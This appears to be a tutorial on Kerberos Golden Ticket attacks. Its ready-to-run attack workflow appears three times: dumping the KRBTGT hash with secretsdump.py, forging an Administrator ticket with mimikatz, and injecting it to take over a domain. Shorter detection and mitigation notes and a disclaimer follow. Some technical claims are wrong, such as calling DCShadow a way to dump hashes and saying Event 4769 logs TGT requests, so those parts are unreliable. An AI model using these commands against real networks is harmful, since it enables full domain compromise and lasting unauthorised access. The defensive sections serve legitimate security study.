Here's a detailed guide on **Golden Ticket Attacks in Kerberos**:

---

# **Golden Ticket Attack - Kerberos**

## **Understanding Golden Ticket Attacks**

- **Golden Ticket** attacks involve creating forged Kerberos Ticket Granting Ticket (TGT) that allows an attacker to impersonate any user, including high-privilege accounts such as Domain Admins.
- This type of attack requires access to the **KRBTGT** account hash, which is the secret key used by the Key Distribution Center (KDC) to encrypt TGTs.

---

## **How Golden Ticket Works**

1. **Kerberos Authentication Process:**

   - In Kerberos, the KDC issues TGTs for clients to access services.
   - The TGT is encrypted with the **KRBTGT** account's NTLM hash.
   - If an attacker obtains the **KRBTGT hash**, they can generate their own TGTs, effectively gaining access to any service.

2. **Attack Vector:**
   - If an attacker can dump the **KRBTGT** account hash (typically via techniques like **DCShadow**, **Dumping NTDS.dit**, or gaining local admin access on a Domain Controller), they can forge Golden Tickets.

---

## **Tools and Techniques**

### **Enumerating Golden Ticket Vulnerabilities:**

- **Dumping KRBTGT Hash:**

  ```powershell
  secretsdump.py <domain-controller> -just-dc -outputfile krbtgt_hash.txt
  ```

- **Finding Domain Controller:**
  ```powershell
  nltest /dsgetdc:<domain_name>
  ```

---

### **Performing Golden Ticket Attack (Mimikatz):**

- **Steps Involved:**
  1.  **Obtain KRBTGT Hash:**  
      Dump the **KRBTGT** hash from the Domain Controller.
  2.  **Generate Golden Ticket:**  
      Use the **KRBTGT** hash to forge a TGT.
  3.  **Pass the TGT to the Target Service:**  
      Use the forged TGT to authenticate to any service within the domain.

---

## **Attack Workflow (Golden Ticket):**

### **Step 1: Dump KRBTGT Hash (Impacket or Mimikatz)**

```powershell
secretsdump.py -just-dc -outputfile krbtgt_hash.txt <domain-controller-ip>
```

### **Step 2: Create Golden Ticket Using Mimikatz (Mimikatz)**

```powershell
mimikatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain-sid> /rc4:<krbtgt-hash> /id:500"
```

- `username`: The target username (could be Administrator or any user).
- `domain`: The domain name.
- `sid`: The domain SID (can be fetched via `wmic useraccount get sid`).
- `krbtgt-hash`: The hash of the KRBTGT account.
- `id`: The user ID for the Golden Ticket (e.g., 500 for Administrator).

### **Step 3: Pass the Golden Ticket for Authentication**

```powershell
mimikatz.exe "kerberos::ptt <golden_ticket.kirbi>"
```

- This injects the TGT into the current session, allowing the attacker to authenticate as the chosen user.

---

### **Example Attack Workflow (Full):**

1. **Dump KRBTGT Hash:**

   ```powershell
   secretsdump.py -just-dc -outputfile krbtgt_hash.txt <domain-controller-ip>
   ```

2. **Generate Golden Ticket with Mimikatz:**

   ```powershell
   mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890 /rc4:abcdef1234567890abcdef1234567890 /id:500"
   ```

3. **Inject and Use the Golden Ticket:**

   ```powershell
   mimikatz.exe "kerberos::ptt <golden_ticket.kirbi>"
   ```

4. **Access Domain Resources as Admin:**
   - Use tools like **Remote Desktop Protocol (RDP)** or other services to access systems as the **Administrator** or any other user granted by the Golden Ticket.

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Monitor for Golden Ticket Usage:**

   - Keep an eye on Kerberos Ticket Granting Service (TGS) requests (Event ID 4769) for signs of abnormal TGT usage or requests from unusual accounts.
   - Implement **Advanced Threat Protection (ATP)** solutions that monitor for abnormal Kerberos authentication patterns.

2. **Change the KRBTGT Password Regularly:**

   - Regularly reset the **KRBTGT** account password (this invalidates any existing TGTs).

3. **Restrict Access to Domain Controllers:**

   - Limit the number of users with administrative access to domain controllers and ensure proper segmentation.

4. **Implement Multi-Factor Authentication (MFA):**
   - For accessing high-value assets and domain controllers, implement MFA to add an extra layer of security.

---

### **Detection Techniques:**

- **Monitor Event Logs:**

  - **Event ID 4769**: Watch for suspicious TGT requests, especially those with long ticket lifetimes or requests for highly privileged accounts.
  - **Event ID 4672**: Track privileged logon events (e.g., Administrator logons).

- **Check for Golden Ticket Anomalies:**
  - Monitor for any requests for service tickets that are not normally made by a user, especially to high-privilege accounts.

---

## **Testing Golden Ticket Configurations:**

- **Check for Unusual TGT Requests:**

  ```powershell
  Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4769 }
  ```

- **Audit for KRBTGT Hash Dumping:**
  - Audit for tools like **Mimikatz** or **Impacket** by checking for suspicious executables or commands running in the environment.

---

## **Real-World Impact:**

- **Domain Admin Privileges:**

  - By forging a valid TGT, attackers can impersonate any user, including domain administrators, gaining full access to network resources.

- **Persistence:**

  - Golden Tickets can be used for persistent access to the network until the KRBTGT account password is changed, making it a long-term threat.

- **Lateral Movement:**
  - Attackers can pivot to other machines and services by leveraging Golden Tickets, allowing for extensive lateral movement across the domain.

---

## **Example Scenario (Full):**

1. **Dump KRBTGT Hash:**

   ```powershell
   secretsdump.py -just-dc -outputfile krbtgt_hash.txt <domain-controller-ip>
   ```

2. **Generate Golden Ticket:**

   ```powershell
   mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890 /rc4:abcdef1234567890abcdef1234567890 /id:500"
   ```

3. **Inject Golden Ticket:**

   ```powershell
   mimikatz.exe "kerberos::ptt <golden_ticket.kirbi>"
   ```

4. **Access Domain Resources:**
   - Gain access to high-privilege resources as the **Administrator** using the forged Golden Ticket.

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of Kerberos Golden Ticket attacks is illegal and unethical. Always perform security testing with **proper authorization** and in compliance with applicable laws.
